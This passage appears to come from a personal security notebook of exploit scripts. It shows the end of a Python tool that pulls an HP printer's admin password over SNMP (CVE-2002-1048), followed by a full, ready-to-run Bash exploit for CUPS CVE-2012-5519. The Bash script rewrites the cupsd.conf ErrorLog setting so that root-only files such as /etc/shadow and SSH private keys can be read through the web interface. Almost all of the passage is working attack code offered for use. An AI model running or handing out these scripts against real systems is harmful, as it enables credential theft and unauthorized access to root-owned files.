>     oid = ".1.3.6.1.4.1.11.2.3.9.1.1.13.0"
> 
>     print(banner())
> 
>     parser = argparse.ArgumentParser(
>         description = Fore.MAGENTA +
>             '''This tool queries via SNMPv2c an specific OID value which corresponds to the admin passwd for the web and telnet services'''
>             + Style.RESET_ALL
>     )
> 
>     parser.add_argument('host', help='SNMP Agent')
>     parser.add_argument('community_string', help='SNMPv2c Community String')
> 
>     opts = parser.parse_args()
> 
>     if len(sys.argv) != 3:
> 
>         parser.print_help()
>         sys.exit(1)
> 
>     print(Fore.CYAN +
>         f"""Target → {Fore.MAGENTA}{opts.host}{Fore.CYAN}
> Community String → {Fore.MAGENTA}{opts.community_string}{Fore.CYAN}
> OID → {Fore.MAGENTA}{oid}
>         """ + Style.RESET_ALL
>     )
> 
>     p = log.progress(Fore.CYAN + "SNMPv2C" + Style.RESET_ALL)
>     p.status(
>         Fore. MAGENTA + f"Requesting the OID to {Fore.YELLOW}{opts.host}{Fore.MAGENTA} using {Fore.YELLOW}{opts.community_string}{Fore.MAGENTA} as Community String... ⌛"
>         + Style.RESET_ALL
>     )
> 
>     await asyncio.sleep(2)
> 
>     print(
>         "\n",
>         Fore.CYAN + f"{oid}" + Style.RESET_ALL, " = ",
>         Fore.GREEN + await getOID(opts.host, opts.community_string, oid) + Style.RESET_ALL,
>         "\n"
>     )
> 
> if __name__ == '__main__':
> 
>     asyncio.run(main())
> ```
>

![[CVE-2002-1048.gif|450]]

> ***Zoom In***

##### *CVE-2012-5519*

> ***[Reference](https://github.com/4l3xBB/Exploits/tree/main/CVE-2012-5519)***

> [!IMPORTANT]- *CVE-2012-5519*
>
> ```bash
> #!/usr/bin/env bash
> 
> # Set colors if the script is running from a terminal
> 
> [ -t 1 ] && {
> 
>     _RESET=$( tput sgr0 )
>     _RED=$( tput setaf 1 )
>     _PINK=$( tput setaf 219 )
>     _PURPLE=$( tput setaf 200 )
>     _GREEN=$( tput setaf 10 )
>     _BLUE=$( tput setaf 159 )
>     _GREEN=$( tput setaf 83 )
> }
> 
> # This ensures that the script can only be run from bash
> 
> [ -z "$BASH_VERSINFO" ] && {
> 
>     cat << ERROR >&2
>     $_RED
>     [!] Execution failed. Try to run this script as follows:
> 
>             ${_PURPLE}bash ${0##*/} or ./${0##*/}
>     $_RESET
> ERROR
> 
>     return 1
> }
> 
> banner ()
> {
>     cat << BANNER
>     $_PURPLE
>      ██████╗██╗   ██╗███████╗    ██████╗  ██████╗  ██╗██████╗       ███████╗███████╗ ██╗ █████╗ 
>     ██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗███║╚════██╗      ██╔════╝██╔════╝███║██╔══██╗
>     ██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║╚██║ █████╔╝█████╗███████╗███████╗╚██║╚██████║
>     ██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║ ██║██╔═══╝ ╚════╝╚════██║╚════██║ ██║ ╚═══██║
>     ╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝ ██║███████╗      ███████║███████║ ██║ █████╔╝
>      ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝  ╚═╝╚══════╝      ╚══════╝╚══════╝ ╚═╝ ╚════╝ 
> 
>      ╭━─━─━─≪✠≫─━─━─━━─━─━─≪✠≫─━─━─━━─━─━─≪✠≫─━─━─━━─━─━─≪✠≫─━─━─━━─━─━─≪✠≫─━─━─━━─━─━─≪✠≫━━━━╮
>      ╰━─━─━─≪✠≫─━─━─━━─━─━─≪✠≫─━─━─━━─━─━─≪✠≫─━─━─━━─━─━─≪✠≫─━─━─━━─━─━─≪✠≫─━─━─━━─━─━─≪✠≫━━━━╯
>     $_RESET
> BANNER
> }
> 
> showHelp ()
> {
>     cat << HELP
>     ${_PINK}DESCRIPTION 🡒 
> 
>         This script allows an attacker to exploit the vuln related to the CVE-2019-5519
> 
>     CVE-DESCRIPTION 🡒
> 
>         It allows local users in the lpadmin group to read or write arbitrary files as root by leveraging the web interface
> 
>     ${_PURPLE}USAGE: ${0##*/} [-h] [--help] --target <TARGET> --port <PORT> --file <FILE> $_RESET
> 
>     ${_BLUE}POSITONAL ARGUMENTS 🡒
> 
>         -t | --target 🡒   IP Address of the target where the CUPS service is running
> 
>         -p | --port   🡒   Port on which the CUPS Service is listening
> 
>         -f | --file   🡒   Sensible System File to read e.g. /etc/shadow, /root/.ssh/id_rsa, /root/.bash_history
> 
>     ${_PINK}OPTIONS 🡒
> 
>         -h | --help   🡒   Displays this help :) $_RESET
> 
>     ${_RED}EXAMPLES 🡒
> 
>         ${0##*/}  -t <TARGET> -p <PORT> -f <FILE>
>         ${0##*/}  -t<TARGET>  -p<PORT>  -f<FILE>
>         ${0##*/}  -t=<TARGET> -p=<PORT> -f=<FILE>
> 
>         ${0##*/}  --target <TARGET> --port <PORT> --file <FILE>
>         ${0##*/}  --target=<TARGET> --port=<PORT> --file=<FILE>
>     $_RESET
> HELP
> }
> 
> checkBash ()
> {
>     # This function checks that this script is running from a bash instance
>     # https://4l3xbb.github.io/Cyb3rBook/001-SCRIPTING/Bash-Versioning
> 
>     case $( /bin/ps -p "$PPID" -o comm= ) in
> 
>         *bash)  return 0
>                 ;;
> 
>         *)      printf >&2 \
>                          "\n\t%s[!] Shell not allowed. Try to run this script from a Bash :( %s\n\n" \
>                          "$_RED" "$_RESET"
>                 return 1
>                 ;;
>     esac
> }
> 
> checkBashVersion ()
> {
>     # This function implements Bash Versioning to ensure that only > 4.0v Bash
>     # can execute it
>     # https://mywiki.wooledge.org/BashFAQ/061
> 
>     (( BASH_VERSINFO[0] < 4 )) && {
> 
>         printf >&2 \
>                "\n\t%s[!] Bash Version < 4.0v(2009 Release). Exiting... %s\n\n" \
>                "$_RED" "$_RESET"
> 
>         return 1
>     }
> 
>     return 0
> }
> 
> sigint_handler ()
> {
>     # Proper SIGINT Handler if the Script receives a SIGINT Signal
>     # https://www.cons.org/cracauer/sigint.html
> 
>     printf >&2 \
>            "\n%s[!] Sigint Signal sent to %s. Exiting... ⏳\n\n%s" \
>            "$_RED" "${0##*/}" "$_RESET"
> 
>     trap - SIGINT
>     kill -SIGINT "$$"
> }
> 
> checkDeps ()
> {
>     # This function checks that all binaries used in this script exist on the system
>     # or in the $PATH parameter of the user running this script
> 
>     local -- _tool=
>     local -a -- _tools=(
> 
>         cupsctl
>         curl
>         timeout
>     )
> 
>     for _tool in "${_tools[@]}"
>     do
>         command -V "$_tool" &> /dev/null || {
> 
>             printf >&2 \
>                    "%s\n\t[!] It seems that %s is not installed :( %s\n\n" \
>                    "$_RED" "$_tool" "$_RESET"
> 
>             return 1
>         }
> 
>     done
> 
>     return 0
> }
> 
> validateIP ()
> {
>     # This functions validates the format of the IP Address provided
> 
>     local -- _octet= _IPRegex='^[0-9]{1,3}(\.[0-9]{1,3}){3}$' \
>              _errorMsg="\n\t${_RED}[!] The provided IP Address is not a valid one :( ${_RESET}\n\n"
> 
>     local -a -- _ip=()
> 
>     [[ $1 =~ $_IPRegex ]] || { printf >&2 "$_errorMsg" ; return 1 ; }
> 
>     IFS=. read -ra _ip <<< "$1"
> 
>     for _octet in "${_ip[@]}"
>     do
>         (( $_octet > 255 )) && { printf >&2 "$_errorMsg" ; return 1 ; }
> 
>     done
> 
>     return 0
> }
> 
> validateFile ()
> {
>     # This functions ensures that the argument provided is a system file (existing or not)
> 
>     local -- _fileRegex='^(\./|/)?([^/]+/)*[^/]+$'
> 
>     [[ $1 =~ $_fileRegex ]] || {
> 
>         printf >&2 \
>                "\n\t%s[!] %s is not a valid file format %s\n\n" \
>                "$_RED" "$1" "$_RESET"
> 
>         return 1
>     }
> 
>     return 0
> }
> 
> checkPort ()
> {
>     # This functions checks if the provided port is open in the specified target
> 
>     local -- _host=$1 _port=$2
> 
>     timeout 2 bash -c "echo '' > /dev/tcp/${_host}/$_port" &> /dev/null
> 
>     (( $? == 0 )) || {
> 
>         printf >&2 \
>                "\n\t%s[!] %s is closed or filtered :( %s\n\n" \
>                "$_RED" "$_port" "$_RESET"
> 
>         return 1
>     }
> 
>     return 0
> }
> 
> checkLPAdmin ()
> {
>     # This function checks that the current user running the script belongs to the lpadmin system group
> 
>     local -- _group=lpadmin
> 
>     [[ $( id -nG ) == *'lpadmin'* ]] || {
> 
>         printf >&2 \
>                "\n\t%s[!] The user %s does not belong to the %s group %s\n\n" \
>                "$_RED" "$( id -un )" "$_group" "$_RESET"
> 
>         return 1
>     }
> 
>     return 0
> }
> 
> checkCupsVersion ()
> {
>     # This function checks if the CUPS Version running on the system is vulnerable by extracting its version
>     # To be vulnerable, it has to be lower or equal than 1.6v
> 
>     local -- _host=$1 _port=$2 _httpStatusCode= _headerValue= \
>              _cupsRegex='CUPS/([0-9]+\.[0-9]+)'
>     local -a -- _cupsVersion=()
> 
>     validateIP "$_host" || return 1
> 
>     checkPort "${_optArgs[target]}" "${_optArgs[port]}" || return 1
> 
>     _httpStatusCode=$(
> 
>         curl --silent \
>              --location \
>              --request GET \
>              --output /dev/null \
>              --write-out '%{http_code}' \
>              "http://${_host}:$_port"
>     ) 
> 
>     (( $_httpStatusCode != 200 )) && {
> 
>         printf >&2 \
>                "\n\t%s[!] Error: %s HTTP Status Code %s\n\n" \
>                "$_RED" "$_httpStatusCode" "$_RESET"
> 
>         return 1
>     }
> 
>     while IFS=':' read -r _ _headerValue
>     do
>         if [[ ${_headerValue#*[[:space:]]} =~ $_cupsRegex ]] ; then
> 
>             IFS=. read -ra _cupsVersion <<< "${BASH_REMATCH[1]}"
>         fi
> 
>     done < <( curl --silent \
>                    --location \
>                    --request GET \
>                    --head \
>                    "http://${_host}:$_port" )
> 
>     (( ${#_cupsVersion[@]} == 0 )) && {
> 
>         printf >&2 \
>                "\n\t%s[!] Could not determine CUPS version %s\n\n" \
>                "$_RED" "$_RESET"
> 
>         return 1
>     }
> 
>     (( _cupsVersion[0] < 1 || ( _cupsVersion[0] == 1 && _cupsVersion[1] <= 6 ) )) || {
> 
>         local -- IFS=.
> 
>         printf >&2 \
>                "\n\t%s[!] CUPS Version (%s) is not vulnerable (CUPSv > 1.6)%s\n\n" \
>                "$_RED" "${_cupsVersion[*]}" "$_RESET"
> 
>         return 1
>     }
> 
>     local -- IFS=.
> 
>     printf \
>         "\n%s[+] The CUPS Version is a valid one: %sCUPS %sv %s\n" \
>         "$_PURPLE" "$_BLUE" "${_cupsVersion[*]}" "$_RESET"
> 
>     return 0
> }
> 
> cupsConfigBackup ()
> {
>     # This function makes a backup of the cupsd.conf configuration file and stores it
>     # on /tmp as cupsd.conf.bk
> 
>     local -- _file=/etc/cups/cupsd.conf _hostname=$( hostname --long )
> 
>     [[ -f $_file ]] || {
>         
>         printf >&2 \
>                "\n\t%s[!] The %s file does not exist in %s :( %s\n\n" \
>                "$_RED" "$_file" "$_hostname" "$_RESET"
> 
>         return 1
>     }
> 
>     cp "${_file}" /tmp/"${_file##*/}".bk &> /dev/null
> 
>     (( $? == 0 )) || {
> 
>         printf >&2 \
>                "\n\t%s[!] The backup of %s failed :( %s\n\n" \
>                "$_RED" "$_file" "$_RESET"
> 
>         return 1
>     }
> 
>     [[ -f /tmp/${_file##*/}.bk ]] && {
> 
>         printf \
>             "\n%s[+] %s backup done in /tmp %s\n" \
>             "$_PURPLE" "$_file" "$_RESET"
> 
>         return 0
>     }
> }
> 
> cupsModify ()
> {
>     # This function modifies the ErrorLog Configuration Parameter of the cupsd.conf file to set the error log
>     # file as the file passed as argument to the function
>     # Then, it makes a HTTP Request to CUPS to show the content of the provided file
> 
>     local -- _host=$1 _port=$2 _file=$3 _hostname=$( hostname --long ) \
>              _httpRequest= _httpStatusCode= _httpResponseBody=
> 
>     validateFile "$_file" || return 1
> 
>     cupsConfigBackup || return 1
> 
>     cupsctl ErrorLog="$_file" WebInterface=Yes &> /dev/null
> 
>     (( $? == 0 )) || {
> 
>         printf >&2 \
>                "\n%s[!] Something went wrong trying to modify the ErrorLog Parameter from %s :( %s\n\n" \
>                "$_RED" "$_file" "$_RESET"
> 
>         return 1
>     }
> 
>     printf \
>         "\n%s[+] ErrorLog configuration parameter modified to %s%s%s\n" \
>         "$_PURPLE" "$_BLUE" "$_file" "$_RESET"
> 
>     printf \
>         "\n%s[+] Requesting the content of %s%s%s using the CUPS Web Interface via HTTP ⏳...%s\n" \
>         "$_PURPLE" "$_BLUE" "$_file" "$_PURPLE" "$_RESET"
> 
>     _httpRequest=$(
> 
>         curl --silent \
>              --location \
>              --request GET \
>              --write-out '%{http_code}' \
>              "http://${_host}:$_port/admin/log/error_log"
>     )
> 
>     _httpStatusCode=$( tail -n 1 <<< "$_httpRequest" )
>     _httpResponseBody=$( awk '{ print body } { body = $0 }' <<< "$_httpRequest" )
> 
>     (( $_httpStatusCode != 200 )) && {
> 
>         printf >&2 \
>                "\n%s[!] Something went wrong trying to request the content of the provided file %s\n\n" \
>                "$_RED" "$_RESET"
> 
>         return 1
>     }
> 
>     printf \
>         "\n%s[+]%s %s 🡒 %s\n%s\n\n" \
>         "$_PURPLE" "$_BLUE" "$_file" "$_RESET" "$_httpResponseBody"
> 
>     return 0
> }
> 
> main ()
> {
>     local -A -- _flags=()
>     local -A -- _optArgs=()
> 
>     (( $# == 0 )) && {
> 
>         cat << ERROR
>     ${_RED}[!] Incorrect number of arguments: $#
>     ${_PINK}[!] Try -h | --help to display the Help Panel :)
>     $_RESET
> ERROR
> 
>         exit 99
>     }
> 
>     while (( $# > 0 ))
>     do
>         [[ $1 == -[tpf]?* ]] && set -- "${1:0:2}" "${1:2}" "${@:2}" && continue           # -tvalue -pvalue -fvalue format
> 
>         [[ $1 == -@(-target|t)=?* ]] && set -- "${1%%=*}" "${1#*=}" "${@:2}" && continue  # -t=value | --target=value format
> 
>         [[ $1 == -@(-port|p)=?* ]] && set -- "${1%%=*}" "${1#*=}" "${@:2}" && continue    # -p=value | --port=value format
> 
>         [[ $1 == -@(-file|f)=?* ]] && set -- "${1%%=*}" "${1#*=}" "${@:2}" && continue    # -f=value | --file=value format
> 
>         case $1 in
> 
>             -t | --target ) (( _flags[t]++ ))
>                             _optArgs[target]=$2
>                             shift
>                             ;;
> 
>             -p | --port )   ((_flags[p]++ ))
>                             _optArgs[port]=$2
>                             shift
>                             ;;
> 
>             -f | --file )   (( _flags[f]++ ))
>                             _optArgs[file]=$2
>                             shift
>                             ;;
> 
>             -h | --help )   showHelp ; exit 0
>                             ;;
> 
>             -- )            shift ; break
>                             ;;
> 
>             * )             printf >&2 \
>                                    "\n\t%s[!] Unknown option: %s. Try -h | --help to display the Help Panel :) %s\n\n" \
>                                    "$_RED" "$1" "$_RESET"
> 
>                             exit 99
>                             ;;
>         esac
>         shift
>     done
> 
>     [[ -z ${_flags[t]} || -z ${_optArgs[target]} ]] && {
> 
>         printf >&2 \
>                "\n\t%s[!] The target/host must be provided. Try -h | --help to display the Help Panel :) %s\n\n" \
>                "$_RED" "$_RESET"
> 
>         exit 99
>     }
> 
>     [[ -z ${_flags[p]} || -z ${_optArgs[port]} ]] && {
> 
>         printf >&2 \
>                "\n\t%s[!] A Port must be provided. Try -h | --help to display the Help Panel%s\n\n" \
>                "$_RED" "$_RESET"
> 
>         exit 99
>     }
> 
>     [[ -z ${_flags[f]} || -z ${_optArgs[file]} ]] && {
> 
>         printf >&2 \
>                "\n\t%s[!] A File must be provided. Try -h | --help to display the Help Panel%s\n\n" \
>                "$_RED" "$_RESET"
> 
>         exit 99
>     }
> 
>     checkDeps || exit 99
> 
>     checkLPAdmin || exit 99
> 
>     checkCupsVersion "${_optArgs[target]}" "${_optArgs[port]}" || exit 99
> 
>     cupsModify "${_optArgs[target]}" "${_optArgs[port]}" "${_optArgs[file]}" || exit 99
> }
> 
> trap sigint_handler SIGINT
> 
> banner
> 
> checkBash || exit 99
> checkBashVersion || exit 99
> 
> main "${@}"
> ```
>

![[CVE-2012-5519.gif|450]]

> ***Zoom In***